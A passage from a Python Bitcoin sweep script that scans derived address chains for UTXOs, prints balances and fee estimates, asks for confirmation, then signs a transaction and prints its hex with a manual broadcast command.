            ext_in, ext_bal = discover_utxos(k_ext, c_ext, electrum, xpub.network, gap_limit, "ext")
            all_inputs.extend(ext_in)
            all_balances.extend(ext_bal)

            print("  Scanning internal chain (change)...")
            int_in, int_bal = discover_utxos(k_int, c_int, electrum, xpub.network, gap_limit, "int")
            all_inputs.extend(int_in)
            all_balances.extend(int_bal)
        else:
            print("  Scanning single chain...")
            ch_in, ch_bal = discover_utxos(k_ext, c_ext, electrum, xpub.network, gap_limit, "chain")
            all_inputs.extend(ch_in)
            all_balances.extend(ch_bal)
    finally:
        electrum.close()

    # ── Balance summary ──────────────────────────────────────────
    print()
    print_sep()
    print("BALANCES FOUND")
    print_sep()

    if not all_balances:
        print("  (no addresses with balance)")
    else:
        col_w = 45
        print(f"  {'Address':<{col_w}}  {'Chain/Idx':<10}  {'UTXOs':>5}  {'Balance (sat)':>12}")
        print(f"  {'-'*col_w}  {'-'*10}  {'-'*5}  {'-'*12}")
        for b in all_balances:
            chain_idx = f"{b.chain_label}/{b.index}"
            print(f"  {b.address:<{col_w}}  {chain_idx:<10}  {len(b.utxos):>5}  {b.total_sat:>12,}")

    total_sat = sum(i.value_sat for i in all_inputs)
    fee = estimate_fee(len(all_inputs), dest_spk, fee_rate) if all_inputs else 0
    output_value = total_sat - fee

    print()
    print(f"  Total UTXOs    : {len(all_inputs)}")
    print(f"  Total balance  : {total_sat:,} sat")
    print(f"  Estimated fee  : {fee:,} sat  ({len(all_inputs)} inputs × 68 vB + overhead, @{fee_rate} sat/vB)")
    print(f"  To receive     : {output_value:,} sat  →  {destination}")

    if not all_inputs:
        print()
        print("  No funds to sweep. Exiting.")
        sys.exit(0)

    if output_value <= 0:
        print()
        print(f"  [!] Fee ({fee:,} sat) exceeds balance ({total_sat:,} sat).")
        print("  Lower the fee-rate or gap-limit and try again.")
        sys.exit(1)

    # ── Confirmation ─────────────────────────────────────────────
    print()
    print_sep()
    confirm = input("Build and sign the transaction? (y/N): ").strip().lower()
    if confirm not in ("y", "yes"):
        print("Cancelled.")
        sys.exit(0)

    # ── Build and sign ───────────────────────────────────────────
    print()
    print_sep()
    print("SIGNING TRANSACTION")
    print_sep()

    SEQUENCE = 0xFFFFFFFD
    NVERSION = 2
    NLOCKTIME = 0

    outputs_serialized = (
        struct.pack("<Q", output_value)
        + encode_varint(len(dest_spk))
        + dest_spk
    )

    witnesses = []
    for i, inp in enumerate(all_inputs):
        sighash = build_sighash_bip143(
            all_inputs, outputs_serialized, i, SEQUENCE, NVERSION, NLOCKTIME
        )
        sig = sign_ecdsa(inp.privkey, sighash)
        witnesses.append([sig, inp.pubkey])
        print(f"  Input {i+1}/{len(all_inputs)} signed ✓")

    raw_tx = serialize_tx(all_inputs, dest_spk, output_value, witnesses)
    txid = compute_txid(all_inputs, dest_spk, output_value)

    print()
    print_sep()
    print("RESULT")
    print_sep()
    print(f"  Expected TXID  : {txid}")
    print(f"  TX size        : {len(raw_tx)} bytes")
    print()
    print("  Signed TX (hex):")
    print(raw_tx.hex())
    print()
    print("  Manual broadcast:")
    print(f"    bitcoin-cli sendrawtransaction {raw_tx.hex()}")
    print( "    — or via Electrum: blockchain.transaction.broadcast")
    print_sep()


if __name__ == "__main__":
    main()
